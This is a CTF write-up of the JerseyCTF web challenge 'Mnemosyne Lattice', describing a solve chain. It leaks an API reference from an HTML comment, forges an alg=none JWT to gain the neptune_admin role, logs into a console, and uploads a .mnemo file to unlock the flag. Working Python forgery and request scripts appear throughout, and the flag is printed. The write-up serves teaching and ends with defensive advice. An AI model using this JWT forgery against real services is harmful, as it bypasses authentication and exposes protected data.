# Mnemosyne Lattice (NME-Ω) — JerseyCTF Writeup

**Challenge:** Mnemosyne Lattice (NME-Ω)  
**Category:** web  
**Difficulty:** Hard  
**Points:** 987  
**Solves:** 26  
**Author:** Trent  
**Flag:** `jctf{mnemosyne_remembers_even_when_humans_forget}`

---

## Description

> Neptune was never a colony; it was Orion's mediation node, built to preserve reference states long after operators were gone. Its degraded interfaces still hold records about the material that made the gate network possible. Explore the system, understand its trust model, and recover what Orion sealed inside the archive.

**URL:** `http://mnemosyne-lattice.aws.jerseyctf.com`

---

## Background Knowledge (Read This First!)

### What is a JWT?

A **JSON Web Token (JWT)** is a compact, URL-safe token used to represent claims between two parties. It consists of three Base64URL-encoded parts separated by dots:

```
header.payload.signature
```

Example header:
```json
{"typ": "JWT", "alg": "none"}
```

Example payload:
```json
{"sub": "anonymous", "role": "anonymous"}
```

The **signature** is used to verify the token has not been tampered with. However, some misconfigured servers accept `alg: none`, meaning they skip signature verification entirely — accepting any payload you forge.

To decode a JWT payload manually:
```
┌──(zham㉿kali)-[~]
└─$ echo "eyJyb2xlIjoiYW5vbnltb3VzIn0" | base64 -d
{"role":"anonymous"}
```

### What is alg=none JWT forgery?

When a server accepts `alg: none`, it skips signature verification. An attacker can:
1. Get a real token from the server
2. Decode the payload
3. Change any field (e.g. `role: anonymous` → `role: neptune_admin`)
4. Re-encode with an **empty signature**

The forged token looks like:
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJyb2xlIjoibmVwdHVuZV9hZG1pbiJ9.
```
Note the trailing dot — the signature section is intentionally empty.

### What is a multipart/form-data file upload?

A **multipart/form-data** POST is how browsers upload files to a server. In Python you construct the request body manually using a boundary string:

```
----Boundary
Content-Disposition: form-data; name="artifact"; filename="artifact.mnemo"
Content-Type: application/octet-stream

<file contents here>
----Boundary--
```

---

## Solution — Step by Step

### Step 1 — Read the HTML source comment

Visiting the challenge URL and viewing page source reveals a full API reference hidden inside an HTML comment:

```
┌──(zham㉿kali)-[~]
└─$ curl -s http://mnemosyne-lattice.aws.jerseyctf.com/neptune/ | grep -A 40 "Legacy API"
<!--
=====================================================
 Neptune Mediation Service — Legacy API Reference
 (retained for emergency operator continuity)
=====================================================
AUTH MODEL:
  - JWT tokens issued by mediation layer
  - alg=none accepted in degraded mode
  - Roles are advisory, not enforced at edge

ROLES:
  anonymous       initial mediation access
  o-dev           internal developer relay
  neptune_admin   authority / operator context

ENDPOINTS:
  POST /neptune/api/request_new.php      → issues a degraded JWT (anonymous)
  POST /neptune/api/request_submit.php   → submit mediation payload
  GET  /neptune/review.php?id=<id>       → internal review replay path
  GET  /neptune/api/captures.php         → lists archived mediation artifacts

KNOWN ISSUES:
  - authority replay not scrubbed from responses
  - legacy developer tokens still trusted
  - review path leaks internal headers
=====================================================
-->
```

This comment gives us the complete attack surface: JWT forgery with `alg=none`, role escalation to `neptune_admin`, and archive endpoints.

### Step 2 — Get an anonymous JWT

```
┌──(zham㉿kali)-[~]
└─$ curl -s -X POST http://mnemosyne-lattice.aws.jerseyctf.com/neptune/api/request_new.php
{
    "status": "ok",
    "message": "New anonymous token issued (degraded, unsigned).",
    "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJpc3MiOiJuZXB0dW5lLW1lZGlhdGlvbiIsInN1YiI6ImFub255bW91cyIsInJvbGUiOiJhbm9ueW1vdXMiLCJjdHgiOiJkZWdyYWRlZCJ9."
}
```

Decode the payload to confirm the role:

```
┌──(zham㉿kali)-[~]
└─$ echo "eyJpc3MiOiJuZXB0dW5lLW1lZGlhdGlvbiIsInN1YiI6ImFub255bW91cyIsInJvbGUiOiJhbm9ueW1vdXMiLCJjdHgiOiJkZWdyYWRlZCJ9" | base64 -d
{"iss":"neptune-mediation","sub":"anonymous","role":"anonymous","ctx":"degraded"}
```

The server already issues tokens with `alg: none` — no signature is verified.

### Step 3 — Forge a neptune_admin JWT and list captures

Write a script to forge the token and immediately list captures:

```
┌──(zham㉿kali)-[~]
└─$ nano step3.py
```

```python
import urllib.request, urllib.parse, json, base64, http.cookiejar

IP   = "3.80.150.226"
HOST = "mnemosyne-lattice.aws.jerseyctf.com"

jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))

def req(method, url, headers={}, data=None):
    r = urllib.request.Request(url, headers={"Host": HOST, **headers},
                               data=data, method=method)
    try:
        resp = opener.open(r)
    except urllib.request.HTTPError as e:
        resp = e
    return resp.read().decode()

def b64url_encode(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def forge(role, sub=None, ctx="authority"):
    sub = sub or role
    h = {"typ":"JWT","alg":"none"}
    p = {"iss":"neptune-mediation","sub":sub,"role":role,"ctx":ctx,"iat":1776605089}
    hh = b64url_encode(json.dumps(h, separators=(",",":")).encode())
    pp = b64url_encode(json.dumps(p, separators=(",",":")).encode())
    return f"{hh}.{pp}."

# Forge neptune_admin token
tok = forge("neptune_admin", "neptune_admin")
print("[+] forged token:", tok)

# List captures
captures = req("GET", f"http://{IP}/neptune/api/captures.php",
               headers={"Authorization": f"Bearer {tok}"})
print("[+] captures:", captures)
```

```
┌──(zham㉿kali)-[~]
└─$ python3 step3.py
[+] forged token: eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJpc3MiOiJuZXB0dW5lLW1lZGlhdGlvbiIsInN1YiI6Im5lcHR1bmVfYWRtaW4iLCJyb2xlIjoibmVwdHVuZV9hZG1pbiIsImN0eCI6ImF1dGhvcml0eSJ9.
[+] captures: {
    "count": 3,
    "captures": [
        {"request_id": "a91c3d0e12f44b9c", "has_meta": true, "size": 100},
        {"request_id": "cc7a1b83fe2c19aa", "has_meta": true, "size": 105},
        {"request_id": "f2049e7a8b1d2c90", "has_meta": true, "size": 98}
    ]
}
```

Reviewing capture `cc7a1b83fe2c19aa` shows a **redacted** REASON field — the flag is censored and locked behind a different mechanism.

```
┌──(zham㉿kali)-[~]
└─$ curl -s "http://mnemosyne-lattice.aws.jerseyctf.com/neptune/review.php?id=cc7a1b83fe2c19aa" \
  -H "Authorization: Bearer <forged_token>" | grep "REASON"
REASON: ### ##### ## ##### ## ## ##########
```

### Step 4 — Log in to the Authority Console

The challenge has a second interface at `/console/login.php`. The credentials `neptune_admin` / `NPT-AX13-RELAY` are referenced in the challenge lore:

```
┌──(zham㉿kali)-[~]
└─$ nano step4.py
```

```python
import urllib.request, urllib.parse, http.cookiejar

IP   = "3.80.150.226"
HOST = "mnemosyne-lattice.aws.jerseyctf.com"

jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))

def req(method, url, headers={}, data=None):
    r = urllib.request.Request(url, headers={"Host": HOST, **headers},
                               data=data, method=method)
    try:
        resp = opener.open(r)
    except urllib.request.HTTPError as e:
        resp = e
    return resp.read().decode()

def console_cmd(cmd_str):
    r = req("POST", f"http://{IP}/console/terminal.php",
            headers={"Content-Type":"application/x-www-form-urlencoded"},
            data=urllib.parse.urlencode({"cmd": cmd_str}).encode())
    out = []
    for part in r.split("<pre")[1:]:
        c = part.split(">",1)[1].split("</pre>")[0].strip()
        if c: out.append(c)
    return "\n".join(out)

# Login
req("POST", f"http://{IP}/console/login.php",
    headers={"Content-Type":"application/x-www-form-urlencoded"},
    data=urllib.parse.urlencode({"username":"neptune_admin","password":"NPT-AX13-RELAY"}).encode())
print("[+] logged in, cookies:", [(c.name, c.value[:20]) for c in jar])

# Explore console commands
for cmd in ["help", "whoami", "archelp", "lore"]:
    print(f"\n[cmd: {cmd}]")
    print(console_cmd(cmd))
```

```
┌──(zham㉿kali)-[~]
└─$ python3 step4.py
[+] logged in, cookies: [('PHPSESSID', '04d62d4507...')]

[cmd: help]
Neptune Authority Console v3.7
Type 'help' for available commands.
> help
Neptune Authority Console — Command Reference

Available Commands:
  help       Display this help text.
  whoami     Display current clearance status.
  upload     Submit an artifact for validation and clearance escalation.
  archelp    Display archive command notes.
  lore       Display recovered archive notes.
  arhls      List archive directory.
  arccat     Read file contents.

[cmd: archelp]
> archelp
Archive commands:
  arhls [public|sealed]  - list archive directory
  arccat <path>          - read file contents
Notes:
  - sealed is locked until a validated artifact is uploaded.

[cmd: lore]
> lore
Neptune Authority Internal Log (Recovered)
----------------------------------------
[INFO] Archive subsystem mounted: /archives/public
[WARN] Sealed vault requires coated key recognition
[NOTE] Mnemosyne alloy is present in all official archival artifacts
```

Two key clues: the sealed vault needs **Mnemosyne alloy**, and the archive root is `archives/`.

### Step 5 — Find the required file extension

List the public archive and read the private upload filter to find what extension the server accepts:

```
┌──(zham㉿kali)-[~]
└─$ nano step5.py
```

```python
import urllib.request, urllib.parse, http.cookiejar

IP   = "3.80.150.226"
HOST = "mnemosyne-lattice.aws.jerseyctf.com"

jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))

def req(method, url, headers={}, data=None):
    r = urllib.request.Request(url, headers={"Host": HOST, **headers},
                               data=data, method=method)
    try:
        resp = opener.open(r)
    except urllib.request.HTTPError as e:
        resp = e
    return resp.read().decode()

def console_cmd(cmd_str):
    r = req("POST", f"http://{IP}/console/terminal.php",
            headers={"Content-Type":"application/x-www-form-urlencoded"},
            data=urllib.parse.urlencode({"cmd": cmd_str}).encode())
    out = []
    for part in r.split("<pre")[1:]:
        c = part.split(">",1)[1].split("</pre>")[0].strip()
        if c: out.append(c)
    return "\n".join(out)

req("POST", f"http://{IP}/console/login.php",
    headers={"Content-Type":"application/x-www-form-urlencoded"},
    data=urllib.parse.urlencode({"username":"neptune_admin","password":"NPT-AX13-RELAY"}).encode())

print(console_cmd("arhls archives/public"))
print(console_cmd("arccat archives/private/upload_filter.php"))
```

```
┌──(zham㉿kali)-[~]
└─$ python3 step5.py
> arhls archives/public
README.txt
colonies
containment_directive.txt
material_notes.txt
upload.php

> arccat archives/private/upload_filter.php
<?php
function validateArtifact(string $filename): bool {
    return str_ends_with($filename, '.mnemo');
}
```

The required extension is **`.mnemo`**.

### Step 6 — Upload a .mnemo artifact and read the flag

```
┌──(zham㉿kali)-[~]
└─$ nano solve.py
```

```python
import urllib.request, urllib.parse, http.cookiejar

IP   = "3.80.150.226"
HOST = "mnemosyne-lattice.aws.jerseyctf.com"

jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))

def req(method, url, headers={}, data=None):
    r = urllib.request.Request(url, headers={"Host": HOST, **headers},
                               data=data, method=method)
    try:
        resp = opener.open(r)
    except urllib.request.HTTPError as e:
        resp = e
    return resp.read().decode()

def console_cmd(cmd_str):
    r = req("POST", f"http://{IP}/console/terminal.php",
            headers={"Content-Type":"application/x-www-form-urlencoded"},
            data=urllib.parse.urlencode({"cmd": cmd_str}).encode())
    out = []
    for part in r.split("<pre")[1:]:
        c = part.split(">",1)[1].split("</pre>")[0].strip()
        if c: out.append(c)
    return "\n".join(out)

# Login
req("POST", f"http://{IP}/console/login.php",
    headers={"Content-Type":"application/x-www-form-urlencoded"},
    data=urllib.parse.urlencode({"username":"neptune_admin","password":"NPT-AX13-RELAY"}).encode())
print("[+] logged in")

# Upload .mnemo artifact
boundary = "----MnemoBoundary"
content  = b"Mnemosyne alloy certified artifact"
body = (
    f"--{boundary}\r\n"
    f'Content-Disposition: form-data; name="cmd"\r\n\r\nupload\r\n'
    f"--{boundary}\r\n"
    f'Content-Disposition: form-data; name="artifact"; filename="artifact.mnemo"\r\n'
    f"Content-Type: application/octet-stream\r\n\r\n"
).encode() + content + f"\r\n--{boundary}--\r\n".encode()

r = req("POST", f"http://{IP}/console/terminal.php",
        headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
        data=body)
# extract result
out = []
for part in r.split("<pre")[1:]:
    c = part.split(">",1)[1].split("</pre>")[0].strip()
    if c: out.append(c)
print("[+] upload result:\n", "\n".join(out))

# List sealed and read flag
print("\n[+] sealed dir:\n", console_cmd("arhls archives/sealed"))
print("\n[*] FLAG:\n", console_cmd("arccat archives/sealed/FLAG.txt"))
```

```
┌──(zham㉿kali)-[~]
└─$ python3 solve.py
[+] logged in
[+] upload result:
Neptune Authority Console v3.7
Type 'help' for available commands.
> upload
Artifact accepted.
Archive clearance elevated.
Sealed vault unlocked.
Retry: arccat archives/sealed/FLAG.txt

[+] sealed dir:
> arhls archives/sealed
FLAG.txt
colonies.txt
starmap.txt
technologies.txt

[*] FLAG:
> arccat archives/sealed/FLAG.txt
jctf{mnemosyne_remembers_even_when_humans_forget}
Neptune Gate Key – AUTHORIZED
```

---

## Attack Chain Summary

```
HTML source comment → full API reference leaked
         │
         ▼
POST /neptune/api/request_new.php → anonymous JWT (alg=none)
         │
         ▼
Forge JWT: role=neptune_admin, ctx=authority, empty signature
         │
         ▼
GET /neptune/api/captures.php → 3 captures found
         │  (cc7a1b83fe2c19aa has redacted REASON: ### ####...)
         ▼
POST /console/login.php (neptune_admin / NPT-AX13-RELAY)
         │
         ▼
Console: help → archelp → lore → "Mnemosyne alloy required"
         │
         ▼
arccat archives/private/upload_filter.php → extension must be .mnemo
         │
         ▼
Upload artifact.mnemo → "Sealed vault unlocked"
         │
         ▼
arccat archives/sealed/FLAG.txt → jctf{mnemosyne_remembers_even_when_humans_forget}
```

---

## Tools Used

| Tool | Purpose | Level |
|------|---------|-------|
| `curl` | HTTP requests and quick recon | ⭐ Easy |
| `base64 -d` | Decode JWT payload sections manually | ⭐ Easy |
| Python `urllib` | JWT forgery, session handling, file upload | ⭐⭐ Medium |
| HTML source inspection | Discover hidden API reference comment | ⭐ Easy |
| Console `archelp` / `lore` | Discover archive structure and upload requirement | ⭐ Easy |
| Multipart form upload | Upload `.mnemo` artifact to unlock sealed vault | ⭐⭐ Medium |

---

## Key Takeaways

- **Always read the HTML source** — developers sometimes leave full API documentation in HTML comments during "emergency" or "legacy" modes. This one gave us every endpoint, every role, and every known vulnerability.
- **`alg=none` JWT forgery is a real vulnerability** — never trust JWTs without enforcing algorithm verification server-side. The server should whitelist `HS256` and reject `none`.
- **Custom consoles have custom commands** — always run `help` first. The flag was locked behind a purpose-built archive system with specific commands (`arhls`, `arccat`, `upload`) that shell commands like `ls` and `cat` could not replicate.
- **File extension validation as a key** — the `.mnemo` extension acted as a physical key to unlock the sealed vault. Finding the validation logic in `upload_filter.php` via `arccat` was the final puzzle piece.
- **Multi-stage challenges require mapping the full system** — JWT forgery, session authentication, console enumeration, and file upload were all required together. Solving one layer alone would not have been enough.
